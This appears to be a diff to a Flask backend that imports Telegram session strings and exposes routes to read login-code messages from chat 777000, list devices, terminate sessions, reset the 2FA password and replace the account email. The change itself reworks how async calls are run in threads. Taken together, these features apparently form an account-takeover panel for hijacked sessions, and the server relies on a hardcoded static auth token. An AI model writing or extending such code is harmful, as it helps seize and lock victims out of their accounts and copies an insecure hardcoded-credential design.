@@ -13,6 +13,7 @@ from telethon.tl.functions.account import (
 )
 import asyncio
 import os
+import threading
 
 app = Flask(__name__)
 
@@ -25,23 +26,31 @@ accounts = {}
 def check_auth(req):
     return req.headers.get("Authorization") == "secure_token_noobster"
 
+# 🔥 THREAD-SAFE LOOP RUNNER (Server hang nahi hoga)
+def run_async(coro, loop):
+    result = [None]
+    exception = [None]
+    
+    def target():
+        try:
+            result[0] = loop.run_until_complete(coro)
+        except Exception as e:
+            exception[0] = e
+            
+    t = threading.Thread(target=target)
+    t.start()
+    t.join()
+    
+    if exception[0]:
+        raise exception[0]
+    return result[0]
+
 @app.route('/api/auth', methods=['POST'])
 def auth():
     data = request.json
     if data.get('accessKey') == MASTER_ACCESS_KEY:
         return jsonify({"success": True, "token": "secure_token_noobster"})
     return jsonify({"error": "Invalid Key"}), 401
-
-# 🔥 FRESH LOOP FUNCTION (Sabhi routes isko use karenge)
-def get_fresh_loop():
-    try:
-        loop = asyncio.get_event_loop()
-        if loop.is_closed():
-            raise RuntimeError
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    return loop
 
 async def login_pyrogram(session_str, api_id, api_hash):
     from pyrogram import Client as PyroClient
@@ -70,13 +79,14 @@ def add_account():
     if not session_str: return jsonify({"error": "Session required"}), 400
 
     try:
-        loop = get_fresh_loop()
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
 
         if session_str.startswith("BQ") or session_str.startswith("1B"):
-            client, me = loop.run_until_complete(login_pyrogram(session_str, api_id, api_hash))
+            client, me = run_async(login_pyrogram(session_str, api_id, api_hash), loop)
             accounts[str(me.id)] = {"type": "pyrogram", "client": client, "me": me, "loop": loop}
         else:
-            client, me = loop.run_until_complete(login_telethon(session_str, api_id, api_hash))
+            client, me = run_async(login_telethon(session_str, api_id, api_hash), loop)
             if not client: return jsonify({"error": "Invalid Session or Expired"}), 401
             accounts[str(me.id)] = {"type": "telethon", "client": client, "me": me, "loop": loop}
 
@@ -117,36 +127,33 @@ def get_messages(acc_id, chat_id):
     if chat_id != "777000": return jsonify({"error": "Only Notification Bot chat is accessible."}), 403
 
     data = accounts[acc_id]
-    client = data['client']
-    loop = get_fresh_loop()
+    client, loop = data['client'], data['loop']
     msgs = []
 
     try:
         if data['type'] == 'pyrogram':
-            async def fetch_pyro(): return [m async for m in client.get_messages(777000, limit=20)]
-            messages = loop.run_until_complete(fetch_pyro())
+            async def fetch(): return [m async for m in client.get_messages(777000, limit=20)]
+            messages = run_async(fetch(), loop)
             for m in reversed(messages):
                 msgs.append({"text": m.text or "[Media]", "isMine": m.outgoing, "media": None})
         else:
-            async def fetch_tele():
+            async def fetch():
                 entity = await client.get_entity(777000)
                 return await client.get_messages(entity, limit=20)
-            messages = loop.run_until_complete(fetch_tele())
+            messages = run_async(fetch(), loop)
             for m in reversed(messages):
                 msgs.append({"text": m.message or "[Media]", "isMine": m.out, "media": None})
         return jsonify(msgs)
     except Exception as e:
         return jsonify({"error": f"Msg Error: {str(e)}"}), 500
 
-# 🔥 FIXED PROFILE ROUTE
 @app.route('/api/profile/<acc_id>', methods=['GET'])
 def get_profile(acc_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
     if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
 
     data = accounts[acc_id]
-    client, me = data['client'], data['me']
-    loop = get_fresh_loop()
+    client, loop, me = data['client'], data['loop'], data['me']
 
     try:
         if data['type'] != 'telethon':
@@ -170,7 +177,7 @@ def get_profile(acc_id):
                     except: pass
             return has_2fa, devices, admin_chats
 
-        has_2fa, devices, admin_chats = loop.run_until_complete(fetch_info())
+        has_2fa, devices, admin_chats = run_async(fetch_info(), loop)
 
         return jsonify({
             "name": me.first_name, "id": str(me.id),
@@ -181,7 +188,6 @@ def get_profile(acc_id):
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# 🔥 FIXED TERMINATE ROUTE
 @app.route('/api/terminate', methods=['POST'])
 def terminate_sessions():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -190,8 +196,7 @@ def terminate_sessions():
 
     if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
     account = accounts[acc_id]
-    client = account['client']
-    loop = get_fresh_loop()
+    client, loop = account['client'], account['loop']
 
     try:
         async def terminate():
@@ -206,13 +211,12 @@ def terminate_sessions():
                     count += 1
             return count
 
-        count = loop.run_until_complete(terminate())
+        count = run_async(terminate(), loop)
         if action == "current": del accounts[acc_id] 
         return jsonify({"success": True, "message": f"Terminated {count} session(s)."})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# 🔥 FIXED 2FA RESET ROUTE
 @app.route('/api/change-2fa', methods=['POST'])
 def change_2fa():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -221,8 +225,7 @@ def change_2fa():
 
     if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
     account = accounts[acc_id]
-    client = account['client']
-    loop = get_fresh_loop()
+    client, loop = account['client'], account['loop']
 
     try:
         async def set_pwd():
@@ -241,7 +244,7 @@ def change_2fa():
             ))
             return "SUCCESS"
 
-        result = loop.run_until_complete(set_pwd())
+        result = run_async(set_pwd(), loop)
         
         if result == "NO_2FA":
             return jsonify({"error": "2FA is not enabled on this account."}), 400
@@ -250,7 +253,6 @@ def change_2fa():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# 🔥 FIXED EMAIL ROUTES
 @app.route('/api/request-email-otp', methods=['POST'])
 def request_email_otp():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -259,12 +261,11 @@ def request_email_otp():
 
     if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
     account = accounts[acc_id]
-    client = account['client']
-    loop = get_fresh_loop()
+    client, loop = account['client'], account['loop']
 
     try:
         async def send_otp(): await client(SendVerifyEmailCodeRequest(email=new_email))
-        loop.run_until_complete(send_otp())
+        run_async(send_otp(), loop)
         return jsonify({"success": True, "message": "OTP sent to new email."})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -277,12 +278,11 @@ def verify_email_otp():
 
     if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
     account = accounts[acc_id]
-    client = account['client']
-    loop = get_fresh_loop()
+    client, loop = account['client'], account['loop']
 
     try:
         async def verify(): await client(VerifyEmailRequest(email=new_email, code=otp))
-        loop.run_until_complete(verify())
+        run_async(verify(), loop)
         return jsonify({"success": True, "message": "Email changed successfully."})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
